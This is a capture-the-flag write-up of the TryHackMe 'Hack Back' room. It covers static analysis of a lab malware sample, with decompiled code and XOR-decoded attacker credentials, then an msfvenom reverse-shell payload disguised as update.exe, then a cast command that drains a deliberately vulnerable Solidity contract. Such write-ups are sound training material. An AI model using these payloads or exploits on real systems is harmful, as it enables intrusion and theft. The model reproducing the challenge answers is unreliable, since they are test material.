<h1 align="center">Hack Back</h1>
<p align="center">2026, January 7&nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>! Let´s learn together. Access this CTF room <a href="https://tryhackme.com/room/hackback">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/40719be4-307e-4d4f-a068-2ea4fe7c6eed"></p>


<br>
<h2>Task 1 . ACT I . Something Phishy</h2>
<p>You have just been handed a machine by a disgruntled colleague. Pulling hairs out, he explains that, of late, this machine has been very slow and crashed multiple times. They said the machine is relatively new and not nearly at an age where its performance should suffer. They've asked if you can look at the machine and determine what's causing this behavior. Can you use your cyber sleuthing skills and know how to get to the bottom of the machine's performance issue?<br>

Click the green 'Start Machine' button to begin your investigation. The machine will start in Split-Screen view. In case the VM is not visible, use the blue Show Split View button at the top of the page. Alternatively, you can connect to the VM using the credentials below via "Remote Desktop".</p>

<p><em>Answer the questions below</em></p>

```bash
:~/HackBack# nmap -sC -sV -Pn -n -p- -T4 aa.aa.aaa.aaa
...
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CHANGE-MY-HOSTN
|   NetBIOS_Domain_Name: CHANGE-MY-HOSTN
|   NetBIOS_Computer_Name: CHANGE-MY-HOSTN
|   DNS_Domain_Name: CHANGE-MY-HOSTNAME
|   DNS_Computer_Name: CHANGE-MY-HOSTNAME
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-07T...
| ssl-cert: Subject: commonName=CHANGE-MY-HOSTNAME
| Not valid before: 2026-01-06...
|_Not valid after:  2026-07-08T...
|_ssl-date: 2026-01-07T17:05:55+00:00; -1s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
<br>
<p>
  
- navigate to <strong>hackaton-act1-v7</strong></p>

<p><img width="1226" height="566" alt="image" src="https://github.com/user-attachments/assets/a6759f66-a172-495c-891c-671e73f85eb6" /></p>


<p><img width="604" height="96" alt="image" src="https://github.com/user-attachments/assets/0faee955-c870-40d9-9676-35efcae88ee7" /></p>

<p><img width="290" height="243" alt="image" src="https://github.com/user-attachments/assets/09f10f06-6f3f-4c0a-bb6b-08cb0a13c977" /></p>

<p><img width="1231" height="808" alt="image" src="https://github.com/user-attachments/assets/f18b2e9c-5fb3-4a1d-8831-4d06f2e92dba" /></p>

<p><img width="351" height="163" alt="image" src="https://github.com/user-attachments/assets/a5f05f5e-9715-4b7e-b0ee-8d6b4a5491d4" /></p>

```bash
:~/HackBack# python3.9 /opt/impacket/build/scripts-3.9/smbserver.py share . -smb2support -user rose -pass rose
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4...
[*] Callback added for UUID 6...
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (aa.aa.aaa.aaa,49857)
[*] AUTHENTICATE_MESSAGE (\rose,CHANGE-MY-HOSTN)
[*] User CHANGE-MY-HOSTN\rose authenticated successfully
[*] rose:::...
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
```

```bash
C:\Users\Administrator>net use \\xx.xx.xxx.xx\share /user: rose rose
The command completed successfully.
```

```bash
C:\Users\Administrator>copy simpleServer.exe \\xx.xx.xxx.xx\share\simpleServer.exe
         1 file(s) copied.
```

<img width="1209" height="530" alt="image" src="https://github.com/user-attachments/assets/66c6f433-1b31-47c6-b7ab-f0ab355353e0" />

```bash
:~/HackBack# ls
simpleServer.exe
```

```bash
:~/HackBack# file simpleServer.exe
simpleServer.exe: PE32+ executable (console) x86-64, for MS Windows
```


```bash
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
CryptAcquireContext failed: %d
CryptCreateHash failed: %d
CryptHashData failed: %d
CryptGetHashParam failed: %d
Random string: %s
Hash value sum: %lu
Failed. Error Code: %d
Getaddrinfo failed with error: %d
Socket failed with error: %ld
Unable to connect to server!
Send failed with error: %d
Data sent successfully
info
test
email
encrypt
decrypt
post
delay
wait
kill
Buffer size is too small.
cmd /c %s
Failed to execute command: %s
Command executed successfully: %s
Executing info
net user > C:\Users\User\info.txt
not_a_real_flag_just_trolling
g`ww|g`dwv+ljf
umlvm`wEg`ww|g`dwv+ljf
4hQm6I66qME}5w$
N/A Error
N/A Error
N/A Error
N/A Error
Received command: '%s'
Mapped command number: %d
Command: info
Command: test
Command: email
Command: mining
Command: decrypt
Command: get
Command: auth
Command: delay
Command: wait
Command: kill
Unknown command
Initializing Winsock...
Failed. Error Code : %d
Could not create socket : %d
Bind failed with error code : %d
Waiting for incoming connections...
Connection accepted
Received command: '%s'
recv failed with error code : %d
accept failed with error code : %d
RSDS5
C:\Users\User\source\repos\testing_cry\x64\Release\testing_cry.pdb
```



<img width="1116" height="634" alt="image" src="https://github.com/user-attachments/assets/362a3d09-b290-48de-bfc7-d54e9c8b6043" />


<img width="1120" height="635" alt="image" src="https://github.com/user-attachments/assets/9f19474f-23c1-4196-a7bb-95bf81c86823" />

<img width="1231" height="799" alt="image" src="https://github.com/user-attachments/assets/4917a212-3b54-4ec6-a521-5717954e34b2" />

```bash
void FUN_1400017e0(void)

{
  undefined8 in_R9;
  undefined local_208 [256];
  char local_108 [264];
  
  FUN_140001640("g`ww|g`dwv+ljf",(longlong)local_208,0x100,in_R9);
  FUN_140001640("umlvm`wEg`ww|g`dwv+ljf",(longlong)local_108,0x100,in_R9);
  FUN_1400012c0(local_208,0x8f,local_108,in_R9);
  FUN_1400012c0(local_208,0x8f,"4hQm6I66qME}5w$",in_R9);
  return;
}
```

<img width="1236" height="479" alt="image" src="https://github.com/user-attachments/assets/0c53084b-20cd-45e9-afce-0e65f32c3785" />


<p>


*(byte *)(param_2 + local_18) = param_1[local_18] ^ 5;<br>
XOR<br>
5</p>


```bash
void FUN_140001640(char *param_1,longlong param_2,ulonglong param_3,undefined8 param_4)

{
  size_t sVar1;
  longlong lVar2;
  ulonglong uVar3;
  ulonglong local_18;
  
  lVar2 = param_2;
  uVar3 = param_3;
  sVar1 = strlen(param_1);
  if (param_3 < sVar1 + 1) {
    FUN_140001d60("Buffer size is too small.\n",lVar2,uVar3,param_4);
  }
  else {
    local_18 = 0;
    while( true ) {
      sVar1 = strlen(param_1);
      if (sVar1 <= local_18) break;
      *(byte *)(param_2 + local_18) = param_1[local_18] ^ 5;
      local_18 = local_18 + 1;
    }
    sVar1 = strlen(param_1);
    *(undefined *)(param_2 + sVar1) = 0;
  }
  return;
}
```





<img width="1231" height="453" alt="image" src="https://github.com/user-attachments/assets/04cef35e-fcca-4da0-a25d-db4a80ab1b67" />



```bash
Email (Encoded): umlvmwEgww|gdwv+ljf`
umlvm`wEg`ww|g`dwv+ljf

Password (Encoded): 4hQm6I66qME}5w$
```


```bash
In the email string, the character E appears where the @ symbol should be.
ASCII for E is 69. ASCII for @ is 64.
```

<img width="1350" height="238" alt="image" src="https://github.com/user-attachments/assets/119c4ef8-da36-41d5-8496-e8bf1919d9f9" />


<img width="1358" height="254" alt="image" src="https://github.com/user-attachments/assets/3c16967c-57cb-4b27-a345-873ebc832d7a" />


<img width="1353" height="243" alt="image" src="https://github.com/user-attachments/assets/b751d2ae-e9f1-432b-8ce5-fd0d7f1c2e13" />



```bash
FUN_1400017e0

// 1. Decrypts "g`ww|g`dwv+ljf" into local_208
FUN_140001640("g`ww|g`dwv+ljf",(longlong)local_208, ...);

// 2. Passes local_208 (the decrypted domain) to the network function
FUN_1400012c0(local_208, ...);
```

<img width="1232" height="526" alt="image" src="https://github.com/user-attachments/assets/79291efc-9093-4af6-b4b7-ec55e5f467fc" />

```bash
void FUN_1400017e0(void)

{
  undefined8 in_R9;
  undefined local_208 [256];
  char local_108 [264];
  
  FUN_140001640("g`ww|g`dwv+ljf",(longlong)local_208,0x100,in_R9);
  FUN_140001640("umlvm`wEg`ww|g`dwv+ljf",(longlong)local_108,0x100,in_R9);
  FUN_1400012c0(local_208,0x8f,local_108,in_R9);
  FUN_1400012c0(local_208,0x8f,"4hQm6I66qME}5w$",in_R9);
  return;
}
```



<p>

FUN_1400012c0<br>  
Hex Value: 0x8f --> Decimal Value: 143<br>
The malware is connecting to: Host: berrybears.ioc Port: 143 (Standard IMAP port) Credentials: phisher@berrybears.ioc / 1mTh3L33tH@x0r!</p>

<img width="1226" height="447" alt="image" src="https://github.com/user-attachments/assets/0b4e722e-6ff0-44e2-87ca-5e129cac38fe" />

<br>
<br>
<br>
<p>1.1. <em>Are there any credentials present on the suspicious file? If yes, what is the username/email?</em><br>
<code>phisher@berrybears.ioc</code></p>

<br>
<p>1.2. <em>Are there any credentials present on the suspicious file? If yes, what is the password?</em><br>
<code>1mTh3L33tH@x0r!</code></p>
<br>
<h2>Task 2 . ACT II . Hack the APT Boss</h2>
<p>Seems like the investigation points to your colleague falling victim to a phishing attack. The APT made two vital mistakes: Messing with your colleague and, crucially, leaving some credentials for us to find. Given what kind of show they're running, their oversight will be their undoing. How about you try to provide this APT group with a taste of their own medicine? It's time for a Hack Back. Boot up the machine, and let's get to work!<br>

You may access the VM using the AttackBox or your VPN connection. Please alow 3-5 minutes for the VM to fully boot up.<br>

Disclaimer: Hacking activities towards any individual is ethically unacceptable and illegal. Any suspected activity should be reported to the appropriate incident response team for investigation and mitigation. This knowledge is provided solely for educational purposes.</p>

<p><em>Answer the question</em></p>

<p>2.1.<em>What is the root flag?</em> Hint: If you are stuck getting a reverse shell checkout the following MITRE IDs: T1036, T1055, T1202, T1497.<br>
<code>THM{··························}</code></p>

```bash
:~/HackBack# nmap -sC -sV -Pn -n -p- -T4 bb.bb.bbb.bb
...
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: FISHER, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
|_http-title: Ransomware Simulation
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: ACL QUOTA SORT NAMESPACE OK IDLE completed IMAP4rev1 IMAP4 CAPABILITY RIGHTS=texkA0001 CHILDREN
443/tcp   open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
|_http-title: Ransomware Simulation
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10...
|_Not valid after:  2019-11-08...
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: FISHER, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
3306/tcp  open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, FoundRows, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsCompression, InteractiveClient, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: b$'8#GyNZY1&khJx>k#g
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FISHER
|   NetBIOS_Domain_Name: FISHER
|   NetBIOS_Computer_Name: FISHER
|   DNS_Domain_Name: fisher
|   DNS_Computer_Name: fisher
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-07T20:48:38+00:00
| ssl-cert: Subject: commonName=fisher
| Not valid before: 2026-01-06...
|_Not valid after:  2026-07-08...
|_ssl-date: 2026-01-07...; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FISHER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-07...
|_  start_date: N/A
```

```bash
:~/HackBack# ffuf -u http://bb.bb.bbb.bb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 -mc all -fc 404,403 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://bb.bb.bbb.bb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404,403
________________________________________________

                        [Status: 200, Size: 4180, Words: 1281, Lines: 133]
mail                    [Status: 301, Size: 336, Words: 22, Lines: 10]
rc                      [Status: 301, Size: 334, Words: 22, Lines: 10]
Mail                    [Status: 301, Size: 336, Words: 22, Lines: 10]
examples                [Status: 503, Size: 402, Words: 34, Lines: 12]
RC                      [Status: 301, Size: 334, Words: 22, Lines: 10]
xampp                   [Status: 301, Size: 337, Words: 22, Lines: 10]
                        [Status: 200, Size: 4180, Words: 1281, Lines: 133]
:: Progress: [220547/220547] :: Job [1/1] :: 3853 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

<img width="1111" height="517" alt="image" src="https://github.com/user-attachments/assets/b992c17a-e006-461f-89ba-cc42b941d9a5" />

<br>
<br>
<br>

<img width="1130" height="565" alt="image" src="https://github.com/user-attachments/assets/02e8e556-fe07-4d85-a6d7-e014aa9ff0c9" />

<br>
<br>
<br>

<img width="1124" height="469" alt="image" src="https://github.com/user-attachments/assets/11c819a2-50f4-4581-ad8e-4572f730283d" />

<img width="1127" height="668" alt="image" src="https://github.com/user-attachments/assets/4dba480a-0f9c-41f3-8d1f-73c25bdb8cb2" />

<img width="1124" height="670" alt="image" src="https://github.com/user-attachments/assets/008297d9-14b9-4f41-bdc2-1a2c8b892432" />

<img width="1120" height="349" alt="image" src="https://github.com/user-attachments/assets/afeb05ef-44f6-48ae-b689-dc05ac84e3c9" />

<img width="1115" height="418" alt="image" src="https://github.com/user-attachments/assets/da53539e-9903-4906-8124-1146fdde1bdf" />

<img width="1135" height="617" alt="image" src="https://github.com/user-attachments/assets/6021acb5-67c2-4a9b-ae91-96f8e506f99d" />

```bash
:~/HackBack# msfvenom -p windows/x64/shell_reverse_tcp LHOST=xx.xx.xxx.xx LPORT=4444 -f exe -o update.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: update.exe
```

<img width="980" height="444" alt="image" src="https://github.com/user-attachments/assets/6faf6b53-c880-44f2-9b13-bc82fe7f41b5" />

<br>
<br>
<br>
<h2>Task 3 . ACT III . A Phis Best Served Cold</h2>

<p>Leaving those credentials was even more costly than previously thought, with your most recent discovery giving you precisely what you need to initiate your plan. It's time to finish this. Use the smart contract you have found to get your colleague their money back and let digital justice prevail. For one last time, boot up the machine using the 'Start Machine' button and get down to business.<br>

You may access the VM using the AttackBox or your VPN connection. Please alow 3-5 minutes for the VM to fully boot up.<br>

Disclaimer: Hacking activities towards any individual is ethically unacceptable and illegal. Any suspected activity should be reported to the appropriate incident response team for investigation and mitigation. This knowledge is provided solely for educational purposes.</p>

<p><em>Answer the question below</em></p>

<p>3.1. <em>What is the flag?</em><br>
<code>THM{◦◦◦◦◦◦◦◦◦◦}</code></p>

```bash
:~/HackBack# nmap -sC -sV -Pn -n -p- -T4 cc.cc.ccc.ccc
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     content-type: application/json; charset=utf-8
|     content-length: 107
|     Date: Wed, 07 Jan 2026...
|     Connection: close
|     {"message":"Route GET:/nice%20ports%2C/Tri%6Eity.txt%2ebak not found","error":"Not Found","statusCode":404}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     accept-ranges: bytes
|     cache-control: public, max-age=0
|     last-modified: Fri, 05 Jul 2024...
|     etag: W/"1cc-190807d7500"
|     content-type: text/html; charset=UTF-8
|     content-length: 460
|     Date: Wed, 07 Jan 2026...
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/vite.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>Blockchain Challenge</title>
|     <script type="module" crossorigin src="/assets/index-9ec22451.js"></script>
|     <link rel="stylesheet" href="/assets/index-f2ea3435.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     content-type: application/json; charset=utf-8
|     content-length: 76
|     Date: Wed, 07 Jan 2026...
|     Connection: close
|     {"message":"Route OPTIONS:/ not found","error":"Not Found","statusCode":404}
|   X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 65
|     Content-Type: application/json
|_    {"error":"Bad Request","message":"Client Error","statusCode":400}
|_http-title: Blockchain Challenge
8545/tcp open  daap    mt-daapd DAAP
```

```bash
:~/HackBack# ffuf -u http://cc.cc.ccc.ccc/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 -mc all -fc 404 -fs 113,460 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http:///cc.cc.ccc.ccc/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
 :: Filter           : Response size: 113,460
________________________________________________

challenge               [Status: 200, Size: 387, Words: 8, Lines: 1]
:: Progress: [220547/220547] :: Job [1/1] :: 6311 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
```

<img width="1206" height="397" alt="image" src="https://github.com/user-attachments/assets/9c416dad-0f1f-4e17-8d5e-f7be880cd3d0" />

<br>
<br>
<br>

```bash
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    mapping(address => uint256) public balances;
    bool public you_solved_it = false;
    address public owner;

    constructor() {
        owner = msg.sender;
        balances[owner] = 1000;
    }

    function decode(bytes memory data, uint8 key) public pure returns (bytes memory) {
        bytes memory result = new bytes(data.length);
        for (uint256 i = 0; i < data.length; i++) {
            result[i] = bytes1(uint8(data[i]) ^ key);
        }
        return result;
    }

    function transfer(string memory data, uint256 amount) external returns (bool out) {
        
        bytes memory strBytes = bytes(data);
        if (keccak256(abi.encodePacked("ZI^ZI^U_MJI")) == keccak256(decode(strBytes, 44))) {
            you_solved_it = true;
            require(balances[owner] >= amount, "Insufficient balance");
            balances[owner] -= amount;
            balances[msg.sender] += amount;
            return true;
        }
        return false;
    }

    function isSolved() external view returns (bool) {
         //return you_solved_it;
         return (balances[owner] == 0);
    }
function getOwner() external returns(address owner){
        return owner;
    }   
function balanceOf(address addr) external returns(uint256 amount){
        return balances[addr];
    }

    function getOwnerBalance() external view returns (uint256) {
        return balances[owner];
    }

}
```

```bash
...
function transfer(string memory data, uint256 amount) external returns (bool out) {
    
    bytes memory strBytes = bytes(data);

   //👇 44 👇
    if (keccak256(abi.encodePacked("ZI^ZI^U_MJI")) == keccak256(decode(strBytes, 44))) {
        
        you_solved_it = true;
        require(balances[owner] >= amount, "Insufficient balance");
...
```

```bash
:~/HackBack# export API_URL="http://cc.cc.ccc.ccc"
```

```bash
 :~/HackBack# export RPC_URL="http://cc.cc.ccc.ccc:8545"
```

```bash
 :~/HackBack# export CONTRACT_ADDRESS=$(curl -s "${API_URL}/challenge" | jq -r ".contract_address")
```

```bash
 :~/HackBack# export PRIVATE_KEY=$(curl -s "${API_URL}/challenge" | jq -r ".player_wallet.private_key")
```

```bash
 :~/HackBack# echo "---------- API URL     : $API_URL"
---------- API URL     : http://cc.cc.ccc.ccc
```

```bash
 :~/HackBack# echo "---------- RPC URL     : $RPC_URL"
---------- RPC URL     : http://cc.cc.ccc.ccc:8545
```

```bash
 :~/HackBack# echo "- Contract Address     : $CONTRACT_ADDRESS"
- Contract Address     : 0x...
```

```bash
 :~/HackBack# echo "------ Private Key     : $PRIVATE_KEY"
------ Private Key     : 0x...
```

```bash
:~/HackBack# cast send --rpc-url $RPC_URL --private-key $PRIVATE_KEY $CONTRACT_ADDRESS "transfer(string,uint256)" "ververysafe" 1000 --legacy

blockHash               0xcad9a...
blockNumber             6
contractAddress         
cumulativeGasUsed       45463
effectiveGasPrice       1000000000
from                    0x...
gasUsed                 45463
logs                    []
logsBloom               0x000...
root                    
status                  1 (success)
transactionHash         0x...
transactionIndex        0
type                    0
blobGasPrice            
blobGasUsed             
to                      0x...
```


<img width="1243" height="825" alt="image" src="https://github.com/user-attachments/assets/3b3f6ada-40b2-4b49-ab6b-d3fbfc95bf7e" />


<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/b82a5369-e976-4bae-a16f-03708ec128e5"><br><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/0f99a2cd-d3d1-4065-a3b4-02e421fbe036"></p>


<h1 align="center">My TryHackMe Journey ・ 2026, January</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|7      |Hard 🚩 - Dead End?                   |6 |     99ᵗʰ  |     3ʳᵈ    |    2,924ᵗʰ   |       37ᵗʰ     |    136,788  |    1,060    |    84     |
|6      |Easy 🔗 - Linux Strength Training     |5 |     98ᵗʰ  |     3ʳᵈ    |    3,172ⁿᵈ   |       47ᵗʰ     |    136,608  |    1,059    |    84     |
|4      |Medium 🚩 - JVM Reverse Engineering   |3 |     96ᵗʰ  |     3ʳᵈ    |    3,031ˢᵗ   |       46ᵗʰ     |    136,450  |    1,058    |    84     |
|3      |Medium 🚩 - Carrotbane of My Existence|2 |     96ᵗʰ  |     3ʳᵈ    |    3,468ᵗʰ   |       49ᵗʰ     |    136,150  |    1,057    |    84     |
|2      |Easy 🔗 - Learn Rust                  |1 |     96ᵗʰ  |     3ʳᵈ    |    5,152ⁿᵈ   |       67ᵗʰ     |    136,030  |    1,056    |    84     |


</h6></div><br>

<p align="center">Global All Time:    99ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/b25380c6-cb6f-4a10-a2d2-a3003723bf1b"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/10d08cc1-55f8-4e24-89e7-1bcc11ee3789"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/0133ac67-7e44-4614-9901-8d60b4b7c23b"><br><br>
                  Global monthly:    2,924ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/60dae2cf-9c32-47a5-bda8-d73ea8efe008"><br><br>
                  Brazil monthly:      37ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7f088acc-ea64-486c-ba79-46fd8f9b17cd"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>


<img width="1914" height="283" alt="image" src="https://github.com/user-attachments/assets/f56b64a6-3a69-404d-8905-c44794c9c1f3" />
